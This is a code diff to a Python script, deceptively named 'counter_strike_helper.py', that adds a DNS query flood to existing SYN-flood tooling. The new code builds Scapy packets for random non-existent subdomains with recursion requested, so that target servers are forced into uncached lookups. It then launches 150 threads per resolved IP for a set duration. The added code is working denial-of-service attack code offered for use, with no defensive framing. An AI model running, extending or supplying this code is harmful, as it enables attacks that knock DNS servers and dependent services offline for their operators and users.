@@ -1,7 +1,8 @@
 # counter_strike_helper.py
 
 from scapy.all import *
-from scapy.layers.inet import IP, ICMP, TCP
+from scapy.layers.inet import IP, ICMP, TCP, UDP
+from scapy.layers.dns import DNS, DNSQR
 
 
 # ==============================================================================
@@ -154,6 +155,51 @@ def synflood(target_url, port, duration, stop_event, pause_event, threads=150):
     while time.time() < attack_end_time and not stop_event.is_set():
         time.sleep(1)
 
+    stop_event.set()
+
+
+# --- NEW: DNS Query Flood Worker ---
+# This is a Layer 7 DNS attack. It sends valid, but randomized and non-existent,
+# DNS queries to force the target DNS server to perform expensive lookups.
+def dns_query_worker(stop_event, pause_event, target_ip, target_domain):
+    """Worker thread that sends a continuous stream of randomized DNS queries."""
+    while not stop_event.is_set():
+        if pause_event.is_set():
+            time.sleep(1)
+            continue
+        try:
+            # Generate a random subdomain to query. This ensures the record is not cached.
+            rand_length = random.randint(10, 16)
+            random_subdomain = "".join(
+                random.choice(string.ascii_lowercase + string.digits) for _ in range(rand_length))
+            full_domain = f"{random_subdomain}.{target_domain}"
+
+            # Craft the DNS query packet using Scapy
+            # rd=1 asks the server to perform a recursive query, increasing its workload.
+            packet = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=full_domain))
+
+            # Send the packet. verbose=0 prevents flooding our own console.
+            send(packet, verbose=0)
+        except Exception:
+            # If sending fails for any reason, just continue
+            pass
+
+
+# --- NEW: DNS Query Flood Controller ---
+def attack_dns_query_flood(target_domain, duration, stop_event, pause_event, threads=150):
+    """Controller for DNS Query Flood attacks."""
+    ips = resolve_to_ipv4(target_domain)
+    if not ips: return
+
+    attack_end_time = time.time() + duration
+    for ip in ips:
+        for _ in range(threads):
+            t = threading.Thread(target=dns_query_worker, args=(stop_event, pause_event, ip, target_domain))
+            t.daemon = True
+            t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
     stop_event.set()
 
 
